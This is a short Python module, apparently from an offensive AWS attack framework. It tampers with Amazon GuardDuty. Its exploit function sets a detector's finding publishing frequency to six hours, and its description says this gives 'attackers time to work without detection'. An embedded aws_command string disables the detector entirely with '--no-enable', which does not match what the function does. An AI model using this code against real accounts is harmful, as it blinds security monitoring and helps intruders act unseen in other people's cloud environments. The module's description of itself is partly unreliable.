import sys

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "guardduty",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"DETECTOR-ID": {
		"value": "",
		"required": "true",
        "description":"The ID of the GuardDuty Detector to Disable"
	},
	"DETECTOR-TIME": {
		"value": "SIX_HOURS",
		"required": "true",
        "description":"The time configure. Can either be FIFTEEN_MINUTES, ONE_HOUR, or SIX_HOURS"
	}
}
description = "Changes the GD Time to either 1 or 6 hours, giving attackers time to work without detection. Mind you, many security systems detect this behaviour."

aws_command = "aws guardduty update-detector --detector-id <detector-id>  --no-enable  --region <region> --profile <profile>"

calls = [
	"guardduty:UpdateDetector"
]

def exploit(profile, workspace):
	detectorID = variables['DETECTOR-ID']['value']
	detectorTime = variables['DETECTOR-TIME']['value']

	try:
		profile.update_detector(
			DetectorId=detectorID,
			FindingPublishingFrequency=detectorTime,

		)
		status = f"Detector {detectorID} detection time was set to {detectorTime}"
	except Exception as e:
		status = f"Detector {detectorID} was not changed with error code: {str(e)}."

	return {
		"Detector": {
			"Detector": detectorID,
			"Time": detectorTime,
			"Status": status
		}
	}


